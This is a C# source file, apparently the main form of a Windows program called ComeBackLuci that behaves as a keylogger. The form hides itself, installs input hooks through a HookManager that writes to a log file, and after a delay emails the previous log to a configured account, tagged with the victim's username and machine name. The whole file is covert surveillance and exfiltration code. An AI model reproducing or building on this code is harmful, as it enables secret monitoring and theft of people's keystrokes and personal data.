using System;
using System.Windows.Forms;
using System.Threading.Tasks;
using ComeBackLuci.Properties;

namespace ComeBackLuci
{
    public partial class CBL : Form
    {
        private HookManager _hm;

        public CBL()
        {
            InitializeComponent();
        }

        private void CBL_Load(object sender, EventArgs e)
        {
            this.Hide();
        }

        private void CBL_Shown(object sender, EventArgs e)
        {
            if (!Settings.Default.Setup)
            {
                using (MConfig c = new MConfig())
                {
                    c.ShowDialog();
                }

                Settings.Default.Setup = true;
                Settings.Default.Save();
            }

            if (Settings.Default.LastFile != string.Empty)
            {
                string lastFile = Settings.Default.LastFile;

                string user = CryptoManager.LuciWhereAreYou(Settings.Default.User);
                string password = CryptoManager.LuciWhereAreYou(Settings.Default.Password);

                if (user != null && password != null)
                {
                    Task.Run(async () =>
                    {
                        await Task.Delay(15000);

                        using (MailManager mm = new MailManager(user, password, true))
                        {
                            mm.SetSubject($"{Environment.UserName} - {Environment.MachineName}");
                            mm.SetBody("");
                            mm.AddAttachment(lastFile);
                            mm.Send();
                        }
                    });
                }
            }

            _hm = new HookManager();

            Settings.Default.LastFile = _hm.GetHookFile();
            Settings.Default.Save();

            _hm.Subscribe();
        }

        private void CBL_FormClosing(object sender, FormClosingEventArgs e)
        {
            _hm?.Dispose();
        }
    }
}